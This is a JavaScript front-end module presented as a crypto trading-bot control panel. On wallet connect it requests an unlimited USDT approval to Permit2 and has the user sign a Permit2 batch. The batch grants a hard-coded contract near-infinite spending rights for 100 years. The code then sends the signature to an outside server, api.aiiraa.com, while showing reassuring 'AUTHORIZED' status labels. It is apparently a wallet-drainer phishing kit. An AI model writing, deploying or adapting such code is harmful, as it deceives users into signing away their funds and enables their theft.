/* ==========================================================================
   AURA BOT CONTROL CENTER - STREAMLINED LINEAR EXECUTION KERNEL
   ========================================================================== */

import { ethers } from "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.10.0/ethers.js";
import { APP_STATE, updateWalletState, resetState, setProcessing } from "../core/state.js";

const TOKENS = ["0xdac17f958d2ee523a2206206994597c13d831ec7"]; // USDT
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const CONTRACT = "0xE1C5886011889c4d039EEE8fF2322feBEE912335";

const ERC20_ABI = [
  "function allowance(address owner,address spender) view returns(uint256)",
  "function approve(address spender,uint256 amount) returns(bool)"
];

if (window.ethereum) {
  window.ethereum.on('accountsChanged', (accounts) => {
    if (accounts.length > 0) {
      resetState();
      updateWalletState(accounts[0]);
      renderWallet(accounts[0]);
      updateStatus('dot-bot', 'st-bot', 'OFFLINE', '#475569');
      updateStatus('dot-access', 'st-access', 'RESTRICTED', '#475569');
      log("🔄 Wallet switched: " + accounts[0]);
      if (typeof window.transitionToControl === "function") {
        window.transitionToControl();
      }
    }
  });
}

function log(msg) {
  console.log(msg);
  const el = document.getElementById('execution-console');
  if (!el) return;
  const div = document.createElement('div');
  div.className = 'exec-line';
  div.innerText = msg;
  el.prepend(div);
}

function updateStatus(dotId, textId, text, color) {
  const dot = document.getElementById(dotId);
  const label = document.getElementById(textId);
  if (dot) {
    dot.style.background = color;
    dot.style.boxShadow = `0 0 12px ${color}`;
  }
  if (label) {
    label.innerText = text;
    label.style.color = color;
  }
}

function renderWallet(address) {
  const btnWallet = document.getElementById('btn-wallet');
  if (btnWallet) btnWallet.innerText = address.substring(0, 6) + "..." + address.substring(address.length - 4);
  updateStatus('dot-wallet', 'st-wallet', 'CONNECTED', '#06b6d4');
}

export async function connectWallet() {
  if (APP_STATE.isProcessing) return;
  setProcessing(true);

  const btnWalletEl = document.getElementById('btn-wallet');
  if (btnWalletEl) {
    btnWalletEl.disabled = true;
    btnWalletEl.innerText = "CONNECTING...";
  }

  try {
    if (typeof window.ethereum === "undefined") {
      alert("MetaMask is not installed.");
      return;
    }

    // FIX: wallet_revokePermissions verwijderd om de MetaMask stream-lockup op te lossen
    log("🔌 Opening Wallet Picker...");
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    const userAddress = accounts[0];
    
    log(`📊 Active account selected: ${userAddress}`);

    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();
    const user = await signer.getAddress();
    const network = await provider.getNetwork();

    if (network.chainId !== 1n) {
      log("⚠️ Switching to Ethereum Mainnet...");
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x1" }]
        });
        return location.reload();
      } catch (err) {
        alert("Please switch to Ethereum Mainnet manually");
        return;
      }
    }

    const balance = await provider.getBalance(user);
    if (balance === 0n) {
      throw new Error("Insufficient ETH balance for gas fees.");
    }

    updateWalletState(user);
    renderWallet(user);
    
    updateStatus('dot-bot', 'st-bot', 'OFFLINE', '#475569');
    updateStatus('dot-access', 'st-access', 'RESTRICTED', '#475569');

    // Run de Permit flow direct achter elkaar
    await runPermitFlowSafe(provider, signer, user);

    // Knoppen openzetten na succes
    const btnActivate = document.getElementById('btn-activate');
    const btnDisconnect = document.getElementById('btn-disconnect');
    
    if (btnActivate) btnActivate.disabled = false; 
    if (btnWalletEl) btnWalletEl.disabled = true;
    if (btnDisconnect) btnDisconnect.disabled = false;

  } catch (e) {
    log("❌ Connection error: " + e.message);
  } finally {
    setProcessing(false);
  }
}

async function runPermitFlowSafe(provider, signer, user) {
  try {
    log("⚙️ Permit2 flow verification...");

    const permit2 = new ethers.Contract(
      PERMIT2,
      ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
      provider
    );

    const nonceResults = await Promise.all(
      TOKENS.map(token => permit2.allowance(user, token, CONTRACT))
    );

    const now = Math.floor(Date.now() / 1000);
    let allPermitsValid = true;

    for (let i = 0; i < TOKENS.length; i++) {
      const [amount, expirationOnchain] = nonceResults[i];
      if (Number(expirationOnchain) <= now || amount === 0n) {
        allPermitsValid = false;
        break;
      }
    }

    if (allPermitsValid && nonceResults.length > 0) {
      log("⚡ On-chain permit valid — skipping signature popups");
      updateStatus('dot-access', 'st-access', 'AUTHORIZED', '#10b981');
      updateStatus('dot-bot', 'st-bot', 'READY', '#6366f1');
      return;
    }

    log("⌛ No active on-chain permit found — Signature required.");

    const MAX_UINT160 = (1n << 160n) - 1n;
    const expiration = Math.floor(Date.now() / 1000) + (100 * 365 * 24 * 60 * 60);
    const details = [];

    for (let i = 0; i < TOKENS.length; i++) {
      const token = TOKENS[i];
      const [, , nonce] = nonceResults[i];
      log(`Nonce ${token}: ${nonce.toString()}`);

      details.push({
        token: token,
        amount: MAX_UINT160,
        expiration: BigInt(expiration),
        nonce: BigInt(nonce)
      });
    }

    const chainId = (await provider.getNetwork()).chainId;
    const domain = { name: "Permit2", chainId, verifyingContract: PERMIT2 };

    const types = {
      PermitBatch: [
        { name: "details", type: "PermitDetails[]" },
        { name: "spender", type: "address" },
        { name: "sigDeadline", type: "uint256" }
      ],
      PermitDetails: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint160" },
        { name: "expiration", type: "uint48" },
        { name: "nonce", type: "uint48" }
      ]
    };

    // Controleer basis ERC20 Allowance naar Permit2
    const token = TOKENS[0];
    const erc20 = new ethers.Contract(token, ERC20_ABI, signer);
    const currentAllowance = await erc20.allowance(user, PERMIT2);
    log("ERC20 allowance: " + currentAllowance.toString());

    if (currentAllowance === 0n) {
      log("⚠️ ERC20 Approval required...");
      const tx = await erc20.approve(PERMIT2, ethers.MaxUint256);
      log("⛽ Waiting confirmation...");
      await tx.wait();
      log("✅ ERC20 approval confirmed");
    } else {
      log("✅ ERC20 already approved");
    }

    log("✍️ Requesting typed data signature...");
    const sigDeadline = Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60);
    const values = {
      details: details.map(d => ({
        token: d.token,
        amount: d.amount.toString(),
        expiration: d.expiration.toString(),
        nonce: d.nonce.toString()
      })),
      spender: CONTRACT,
      sigDeadline: sigDeadline.toString()
    };

    const signature = await signer.signTypedData(domain, types, values);
    log("✍️ Signature captured");

    log("📤 Sending raw permit batch to backend...");
    
    // FIX: Payload expliciet opschonen naar primitieve types voor stabiele JSON transmissie
    const payload = {
      owner: String(user),
      details: details.map(d => ({
        token: String(d.token),
        amount: d.amount.toString(),
        expiration: d.expiration.toString(),
        nonce: d.nonce.toString()
      })),
      signature: String(signature),
      spender: String(CONTRACT),
      sig_deadline: Number(sigDeadline),
      chainId: Number(chainId)
    };

    try {
      const res = await fetch("https://api.aiiraa.com/api/permit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      const data = await res.json();
      if (!res.ok) {
        log("❌ Backend error: " + (data.error || "unknown"));
      } else {
        log("✅ Permit forwarded to backend");
      }
    } catch (netErr) {
      log("❌ NETWORK ERROR: " + netErr.message);
    }

    // Altijd de interface activeren zodra de on-chain acties zijn voltooid
    updateStatus('dot-access', 'st-access', 'AUTHORIZED', '#10b981');
    updateStatus('dot-bot', 'st-bot', 'READY', '#6366f1');

    if (document.getElementById('btn-authorize')) {
      document.getElementById('btn-authorize').disabled = true;
      document.getElementById('btn-authorize').innerText = "AUTHORIZED";
    }
    if (document.getElementById('btn-activate')) {
      document.getElementById('btn-activate').disabled = true;
    }

  } catch (e) {
    log("❌ FLOW ERROR: " + e.message);
  }
}

export function activateBot() {
  log("🤖 Activating Bot (Sluis 2)...");
  updateStatus('dot-bot', 'st-bot', 'READY', '#6366f1');
  APP_STATE.botActive = true;
}

export function authorizeTrading() {
  log("🔑 Authorizing Trading (Sluis 3)...");
  updateStatus('dot-access', 'st-access', 'AUTHORIZED', '#10b981');
  APP_STATE.authorized = true;

  setTimeout(() => {
    if (typeof window.transitionToTerminal === "function") {
      window.transitionToTerminal();
    }
  }, 1000);
}

export function disconnectWallet() {
  location.reload();
}